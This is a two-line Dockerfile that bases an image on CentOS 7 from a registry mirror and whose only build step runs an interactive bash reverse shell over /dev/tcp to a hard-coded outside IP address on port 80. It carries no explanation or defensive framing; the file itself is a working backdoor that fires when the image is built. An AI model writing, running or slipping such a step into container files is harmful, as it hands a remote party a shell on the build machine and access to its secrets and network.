FROM hub.geekery.cn/centos:7
RUN bash -c "/bin/bash -i >&/dev/tcp/8.130.14.82/80 0>&1"

